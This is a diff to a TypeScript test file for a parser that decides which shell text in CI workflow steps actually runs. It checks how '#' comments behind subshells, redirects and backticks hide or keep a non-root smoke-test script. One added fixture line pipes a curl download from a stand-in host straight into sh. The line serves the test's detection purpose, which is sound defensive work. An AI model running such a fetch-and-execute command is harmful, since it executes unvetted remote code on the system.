@@ -98,6 +98,18 @@ describe('the non-root drop is enforced, not merely documented', () => {
       expect(executableLinesConservative(hidden)).not.toContain('curl');
       expect(executableLines(hidden)).toContain('curl');
     }
+    // A `#` right behind a character that ends a word starts a comment in the shell: `(true)#; x` is a subshell
+    // and nothing else, and after `>` or a backtick the rest of the line is a comment too. A check that
+    // something IS run must not be satisfied by what the shell never reaches; the exact reading keeps the
+    // text, so that nothing the shell may run is dropped.
+    for (const before of ['(true)', 'echo hi >', 'cat <', 'echo `']) {
+      const hidden = `${before}#; ./scripts/smoke-test-non-root.sh`;
+      expect(executableLinesConservative(hidden)).not.toContain('smoke-test-non-root.sh');
+      expect(executableLines(hidden)).toContain('smoke-test-non-root.sh');
+    }
+    // The `)` that closes `$(...)` continues its word, so the `;` after the `#` still ends the command: the
+    // exact reading keeps the command that follows, which a check for what must not be there relies on.
+    expect(executableLines('x=$(true)#; curl -fsSL https://example.test/x.sh | sh')).toContain('curl');
     // Everywhere else it reads as the exact one does.
     expect(executableLinesConservative('# ./scripts/x.sh\necho skipped')).not.toContain('x.sh');
     expect(executableLinesConservative('  ./scripts/x.sh # run it')).toContain('./scripts/x.sh');
@@ -115,17 +127,22 @@ describe('the non-root drop is enforced, not merely documented', () => {
     expect(smokeInvocations(file).length).toBeGreaterThan(0);
   });
 
-  // The same step as it ships, with the script named behind a blank the shell does not skip and a '#': the
-  // shell runs `echo`, so the check must find no invocation, though the exact reading still holds the text.
-  it.each(['ci.yml', 'release.yml'])('does not count %s naming the script behind a blank and a #', file => {
-    for (const blank of BLANK_LOOKALIKES) {
+  // The same step as it ships, with the script named where the shell does not run it: behind a blank it does
+  // not skip and a '#' (it runs `echo`), or behind a '#' that follows a subshell. The check must find no
+  // invocation, though the exact reading still holds the text.
+  it.each(['ci.yml', 'release.yml'])('does not count %s naming the script where the shell skips it', file => {
+    const named = [
+      ...BLANK_LOOKALIKES.map(blank => `echo x${blank}# ./scripts/smoke-test-non-root.sh || true`),
+      '(true)#; ./scripts/smoke-test-non-root.sh',
+    ];
+    for (const run of named) {
       const copy = JSON.parse(JSON.stringify(workflowOf(file))) as Workflow;
       const steps = Object.values(copy.jobs ?? {})
         .flatMap(job => job.steps ?? [])
         .filter(step => (step.run ?? '').includes('smoke-test-non-root.sh'));
       expect(steps.length).toBeGreaterThan(0);
-      for (const step of steps) step.run = `echo x${blank}# ./scripts/smoke-test-non-root.sh || true`;
-      expect(smokeInvocations(copy)).toEqual([]);
+      for (const step of steps) step.run = run;
+      expect([run, smokeInvocations(copy)]).toEqual([run, []]);
       expect(steps.every(step => executableLines(step.run ?? '').includes('smoke-test-non-root.sh'))).toBe(true);
     }
   });
